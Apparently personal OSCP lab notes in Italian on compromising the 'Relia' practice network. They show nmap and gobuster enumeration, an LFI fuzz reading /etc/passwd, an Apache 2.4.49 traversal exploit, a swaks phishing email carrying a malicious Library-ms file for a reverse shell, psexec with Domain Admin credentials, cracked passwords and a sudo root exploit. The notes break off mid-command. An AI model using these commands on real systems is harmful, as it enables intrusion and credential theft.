
```bash
.189 - proof only
.191 - proof only
.245 - local and proof
.246 - local and proof
.247 - local and proof
.248 - local and proof
.249 - local and proof
.250 - NONE (WINPREP machine)

.6 - proof only
.7 - local and proof
.14 - local and proof 
.15 - local and proof
.19 - local and proof
.20 - local and proof
.21 - proof only
.30 - proof only
```

# DMZ
## 192.168.X.189 - MAIL {pwned:proof}

```bash
nmap -sC -sV -O -p- 192.168.X.189
```

```bash
Nmap scan report for 192.168.204.189 (192.168.204.189)
Host is up (0.035s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: OK completed CAPABILITY QUOTA CHILDREN IMAP4rev1 IDLE ACL RIGHTS=texkA0001 IMAP4 SORT NAMESPACE
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/20%OT=25%CT=1%CU=35212%PV=Y%DS=4%DC=I%G=Y%TM=664B
OS:0AD1%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=I%TS=A)SEQ(SP=104
OS:%GCD=1%ISR=10C%TI=I%TS=A)OPS(O1=M551NW8ST11%O2=M551NW8ST11%O3=M551NW8NNT
OS:11%O4=M551NW8ST11%O5=M551NW8ST11%O6=M551ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF
OS:%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)T
OS:1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T
OS:=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%
OS:UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=D6AE%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-20T08:33:01
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -8s
```

Con le credenziali ottenuti cercando tra i log del repository git presente sulla macchina 249 LEGACY, cerco di inviare un email di phishing agli utenti jim e damian.

Per farlo ho bisogno di costruire un file config.Library-ms malevolo.

Utilizzo quindi la macchina windows per crearlo:

```bash
sudo swaks -t damian@relia.com -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.188.189 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap --auth-user maildmz@relia.com --auth-password DPuBT9tGCBrTbR
```

In questo modo ottengo una reverse-shell per la macchina 14.

Una volta trovate le credenziali del Domain Admin sulla macchina 21, utilizzo questo comando per accedere e collezionare tutte le flag presenti su questa macchina:

```bash
impacket-psexec relia.com/Administrator:"vau\!XCKjNQBv2$"@192.168.205.191
```

## 192.168.X.191 - LOGIN {pwned:proof}

```bash
nmap -sC -sV -O -p- 192.168.X.191
```

```bash
Nmap scan report for 192.168.204.191 (192.168.204.191)
Host is up (0.035s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=192.168.204.191
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-05-20T08:33:12+00:00; -7s from scanner time.
| ssl-cert: Subject: commonName=login.relia.com
| Not valid before: 2024-05-11T16:18:53
|_Not valid after:  2024-11-10T16:18:53
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: LOGIN
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: login.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-20T08:32:57+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/20%OT=80%CT=1%CU=34740%PV=Y%DS=4%DC=I%G=Y%TM=664B
OS:0AD1%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=106%TI=I%TS=A)SEQ(SP=101
OS:%GCD=1%ISR=106%TI=I%TS=A)SEQ(SP=102%GCD=1%ISR=107%TI=I%TS=A)SEQ(SP=103%G
OS:CD=1%ISR=107%TI=I%TS=A)OPS(O1=M551NW8ST11%O2=M551NW8ST11%O3=M551NW8NNT11
OS:%O4=M551NW8ST11%O5=M551NW8ST11%O6=M551ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W
OS:4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)T1(
OS:R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=8
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=D884%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -7s, deviation: 0s, median: -7s
| smb2-time: 
|   date: 2024-05-20T08:33:05
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Visitando la porta 80 mi viene mostrato un form di login:

![](/OSCP/Immagini_OSCP/Relia/191_port_80.png)

Con le credenziali ottenuti cercando tra i log del repository git presente sulla macchina 249 LEGACY riesco ad accedere.

```bash
maildmz@relia.com:DPuBT9tGCBrTbR
```

![](/OSCP/Immagini_OSCP/Relia/191_port_80_login.png)

Riesco ad accedere anche con le seguenti credenziali trovate sulla macchina 14:

```bash
dmzadmin:SlimGodhoodMope
```

Una volta trovate le credenziali del Domain Admin sulla macchina 21, utilizzo questo comando per accedere e collezionare tutte le flag presenti su questa macchina:

```bash
impacket-psexec relia.com/Administrator:"vau\!XCKjNQBv2$"@192.168.205.191
```

## 192.168.X.245 {pwned:local&proof}

```bash
nmap -sC -sV -O -p- 192.168.X.245
```

```bash
Nmap scan report for 192.168.204.245 (192.168.204.245)
Host is up (0.033s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.212
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: RELIA Corp.
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2022-10-12T08:55:44
|_Not valid after:  2032-10-09T08:55:44
|_http-title: RELIA Corp.
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30:0c:6c:9b:ac:07:47:5e:df:6d:ff:38:63:38:2a:fd (RSA)
|   256 f3:a9:70:76:c8:d4:c4:17:f4:39:1f:be:58:9d:1f:a5 (ECDSA)
|_  256 21:a0:79:82:2d:e6:2a:76:11:24:2f:7e:2e:a8:c7:83 (ED25519)
8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/20%OT=21%CT=1%CU=37246%PV=Y%DS=4%DC=I%G=Y%TM=664B
OS:0AD1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(S
OS:P=107%GCD=1%ISR=10B%TI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10C%TI=Z%II=I%TS
OS:=A)SEQ(SP=108%GCD=4%ISR=10C%TI=Z%II=I%TS=A)OPS(O1=M551ST11NW7%O2=M551ST1
OS:1NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M551ST11NW7%O6=M551ST11)WIN(W1=FE
OS:88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5
OS:51NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4
OS:(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%
OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=CE84%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)
```

Provo ad accedere in modalità anonima ad ftp ma non trovo nulla.

Visito la pagina 80:

![](/OSCP/Immagini_OSCP/Relia/245_port_80.png)

Provo a lanciare questo comando:

```bash
gobuster dir -x .pdf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.204.245/
```

E ottengo questo output:

```bash
/.hta.pdf             (Status: 403) [Size: 199]
/.hta                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.htaccess.pdf        (Status: 403) [Size: 199]
/.htpasswd.pdf        (Status: 403) [Size: 199]
/css                  (Status: 301) [Size: 235] [--> http://192.168.204.245/css/]
/fonts                (Status: 301) [Size: 237] [--> http://192.168.204.245/fonts/]
/img                  (Status: 301) [Size: 235] [--> http://192.168.204.245/img/]
/index.html           (Status: 200) [Size: 46262]
/js                   (Status: 301) [Size: 234] [--> http://192.168.204.245/js/]
```

Qui trovo una serie di informazioni utili relative a dei possibili nome utente, ma nient'altro.

Sulla porta 8000 trovo questa pagina:

![](/OSCP/Immagini_OSCP/Relia/245_port_8000.png)

Qui c'è un form di login.

Lanciando il seguente comando:

```bash
whatweb http://192.168.X.245:8000
```

Ottengo il seguente risultato:

```bash
http://192.168.177.245:8000 [200 OK] Apache[2.4.49][mod_wsgi/4.9.4], Country[RESERVED][ZZ], HTML5, HTTPServer[Unix][Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8], IP[192.168.177.245], OpenSSL[1.1.1f], PasswordField[password], Python[3.8], Script
```

Scopro che la versione di apache è vulnerabile al Path Traversal e all'RCE. Tramite searchsploit trovo il codice per sfruttare queste vulnerabilità:

![](/OSCP/Immagini_OSCP/Relia/245_port_8000_rce.png)

Lo sfrutto per leggere il contenuto di /etc/passwd:

![](/OSCP/Immagini_OSCP/Relia/245_port_8000_rce_passwd.png)

Aggiungo nuovi username alla lista.

Utilizzando la lista di utenti creata partendo dal file /etc/passwd e questa lista di file di configurazione di ssh, provo a cercare qualche file che mi potrebbe tornare utile:

```bash
ssh_host_key
ssh_host_key.pub
ssh_host_rsa_key
ssh_host_dsa_key.pub
ssh_host_dsa_key
sshd_config
ssh_config
id_dsa
id_dsa.pub
id_rsa
id_rsa.pub
id_ecdsa.pub
id_ecdsa
id_ed25519
id_ed25519.pub
id_ecdsa-sk
id_ecdsa-sk.pub
id_ecdsa-sk_rk
id_ecdsa-sk_rk.pub
id_ed25519-sk_rk
id_ed25519-sk_rk.pub
moduli
authorized_keys
identity
identity.pub
known_hosts
```

![](/OSCP/Immagini_OSCP/Relia/245_port_8000_rce_ssh_key.png)

Riesco a ricavare il file ic_ecdba per l'utente anita.

Quindi provo a crackarlo utilizzando john e ottengo la password:

```bash
anita:fireball
```

Accedo tramite ssh e ottengo il flag local.txt:

![](/OSCP/Immagini_OSCP/Relia/245_port_8000_local.txt.png)

Ottengo una shell migliore lanciando il seguente comando:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Utilizzando linpeas.sh scopro che la versione di sudo è vulnerabile. Quindi utilizzo questo exploit (https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit) per elevare i miei privilegi:

![](/OSCP/Immagini_OSCP/Relia/245_port_8000_proof.png)

## 192.168.X.246 {pwned:local&proof}

```bash
nmap -sC -sV -O -p- 192.168.X.246
```

```bash
Nmap scan report for 192.168.204.246 (192.168.204.246)
Host is up (0.034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Code Validation
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Not valid before: 2022-10-12T07:46:27
|_Not valid after:  2032-10-09T07:46:27
|_http-title: Code Validation
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
|_  256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/20%OT=80%CT=1%CU=36922%PV=Y%DS=4%DC=I%G=Y%TM=664B
OS:0AD2%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=107%TI=Z%II=I%TS=A)SEQ(S
OS:P=104%GCD=1%ISR=106%TI=Z%II=I%TS=A)SEQ(SP=104%GCD=1%ISR=107%TI=Z%II=I%TS
OS:=A)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7%O5=M
OS:551ST11NW7%O6=M551ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE
OS:88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=CFC7%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

Visito la porta 80 e trovo un validatore di codici:

![](/OSCP/Immagini_OSCP/Relia/246_port_80.png)

Provando ad inserire una stringa a caso mi restituisce questo errore:

![](/OSCP/Immagini_OSCP/Relia/246_port_80_code_format.png)

Provo a lanciare questo comando:

```bash
gobuster dir -x .pdf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.204.246/
```

E ottengo questo output:

```bash
/.hta                 (Status: 403) [Size: 280]
/.hta.pdf             (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htaccess.pdf        (Status: 403) [Size: 280]
/.htpasswd.pdf        (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/css                  (Status: 301) [Size: 316] [--> http://192.168.204.246/css/]
/fonts                (Status: 301) [Size: 318] [--> http://192.168.204.246/fonts/]
/index.php            (Status: 200) [Size: 1516]
/js                   (Status: 301) [Size: 315] [--> http://192.168.204.246/js/]
/server-status        (Status: 403) [Size: 280]
/submit               (Status: 301) [Size: 319] [--> http://192.168.204.246/submit/]
```

Provo ad utilizzare il file id_ecdsa trovato sulla macchina 245 per accedere in ssh tramite l'utente anita. Riesco ad accedere ed ottengo il flag local.txt:

![](/OSCP/Immagini_OSCP/Relia/246_local.png)

Lanciando linpeas.sh scopro che è in piedi qualcosa sulla porta 8000.

Quindi dalla mia macchina lancio il seguente comando:

```bash
ssh -L 9000:127.0.0.1:8000 anita@192.168.166.246 -p 2222 -i anita_id_ecdsa 
```

Visito quindi la pagina http://127.0.0.1:9000:

![](/OSCP/Immagini_OSCP/Relia/246_internal_port_8000.png)
Provo a lanciare questo comando:

```bash
gobuster dir -x .pdf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.204.247/
```

E ottengo questo output:

```bash
/.hta                 (Status: 403) [Size: 276]
/.hta.pdf             (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess.pdf        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.pdf        (Status: 403) [Size: 276]
/backend              (Status: 301) [Size: 315] [--> http://127.0.0.1:9000/backend/]
/css                  (Status: 301) [Size: 311] [--> http://127.0.0.1:9000/css/]
/fonts                (Status: 301) [Size: 313] [--> http://127.0.0.1:9000/fonts/]
/img                  (Status: 301) [Size: 311] [--> http://127.0.0.1:9000/img/]
/index.php            (Status: 200) [Size: 4948]
/js                   (Status: 301) [Size: 310] [--> http://127.0.0.1:9000/js/]
/server-status        (Status: 200) [Size: 7772]
```

Vado sulla pagina backend e trovo un form di login:

![](/OSCP/Immagini_OSCP/Relia/246_internal_port_8000_login.png)

Lanciando questo comando scopro che è vulnerabilè all'LFI:

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://127.0.0.1:9000/backend/?view=FUZZ -fs 757

```

```bash
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 102ms]
../../../../../../../../../../../../etc/hosts [Status: 200, Size: 976, Words: 185, Lines: 44, Duration: 45ms]
../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 51ms]
/../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 54ms]
../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 44ms]
../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 44ms]
../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 61ms]
../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 50ms]
../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 47ms]
../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 43ms]
../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 42ms]
../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 53ms]
../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 73ms]
../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 73ms]
../../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 82ms]
../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 64ms]
../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 74ms]
../../../../../../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 75ms]
../../../../../etc/passwd [Status: 200, Size: 2563, Words: 178, Lines: 69, Duration: 63ms]
```

Trovato un modo per inserire una reverse-shell e diventare root.

## 192.168.X.247 - WEB02 {pwned:local&proof}

```bash
nmap -sC -sV -O -p- 192.168.X.247
```

```bash
Nmap scan report for 192.168.204.247 (192.168.204.247)
Host is up (0.039s latency).
Not shown: 65518 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-title: RELIA - New Hire Information
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2024-05-20T10:35:50+00:00
|_ssl-date: 2024-05-20T10:36:00+00:00; -8s from scanner time.
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2024-05-11T16:16:53
|_Not valid after:  2024-11-10T16:16:53
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
14020/tcp open  ftp           FileZilla ftpd
|_ftp-bounce: bounce working!
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp         237639 Nov 04  2022 umbraco.pdf
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
14080/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Bad Request
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=5/20%OT=80%CT=1%CU=39213%PV=Y%DS=4%DC=I%G=Y%TM=664B
OS:279A%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=108%TI=I%TS=A)OPS(O1=M55
OS:1NW8ST11%O2=M551NW8ST11%O3=M551NW8NNT11%O4=M551NW8ST11%O5=M551NW8ST11%O6
OS:=M551ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF
OS:=Y%T=80%W=FFFF%O=M551NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
OS:(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=859E
OS:%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-20T10:35:53
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -8s, deviation: 0s, median: -9s
```

Visito la porta 80:

![](/OSCP/Immagini_OSCP/Relia/247_port_80.png)

Provo a lanciare questo comando:

```bash
gobuster dir -x .pdf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.204.247/
```

E ottengo questo output:

```bash
/.hta.pdf             (Status: 403) [Size: 305]
/.hta                 (Status: 403) [Size: 305]
/.htaccess.pdf        (Status: 403) [Size: 305]
/.htpasswd.pdf        (Status: 403) [Size: 305]
/.htpasswd            (Status: 403) [Size: 305]
/.htaccess            (Status: 403) [Size: 305]
/assets               (Status: 301) [Size: 344] [--> http://192.168.204.247/assets/]
/aux                  (Status: 403) [Size: 305]
/aux.pdf              (Status: 403) [Size: 305]
/cgi-bin/             (Status: 403) [Size: 305]
/com1                 (Status: 403) [Size: 305]
/com3                 (Status: 403) [Size: 305]
/com3.pdf             (Status: 403) [Size: 305]
/com2                 (Status: 403) [Size: 305]
/com2.pdf             (Status: 403) [Size: 305]
/com1.pdf             (Status: 403) [Size: 305]
/con                  (Status: 403) [Size: 305]
/con.pdf              (Status: 403) [Size: 305]
/css                  (Status: 301) [Size: 341] [--> http://192.168.204.247/css/]
/dashboard            (Status: 301) [Size: 347] [--> http://192.168.204.247/dashboard/]
/favicon.ico          (Status: 200) [Size: 30894]
/examples             (Status: 503) [Size: 405]
/img                  (Status: 301) [Size: 341] [--> http://192.168.204.247/img/]
/index.php            (Status: 200) [Size: 4269]
/js                   (Status: 301) [Size: 340] [--> http://192.168.204.247/js/]
/licenses             (Status: 403) [Size: 424]
/lpt1                 (Status: 403) [Size: 305]
/lpt2                 (Status: 403) [Size: 305]
/lpt1.pdf             (Status: 403) [Size: 305]
/lpt2.pdf             (Status: 403) [Size: 305]
/nul.pdf              (Status: 403) [Size: 305]
/nul                  (Status: 403) [Size: 305]
/pdfs                 (Status: 301) [Size: 342] [--> http://192.168.204.247/pdfs/]
/phpmyadmin           (Status: 403) [Size: 305]
/prn                  (Status: 403) [Size: 305]
/prn.pdf              (Status: 403) [Size: 305]
/server-info          (Status: 403) [Size: 424]
/server-status        (Status: 403) [Size: 424]
/webalizer            (Status: 403) [Size: 305]
```

Sulla pagina http://192.168.204.247/pdfs trovo diversi pdf e li scarico.

Su ogni pdf eseguo questo comando:

```bash
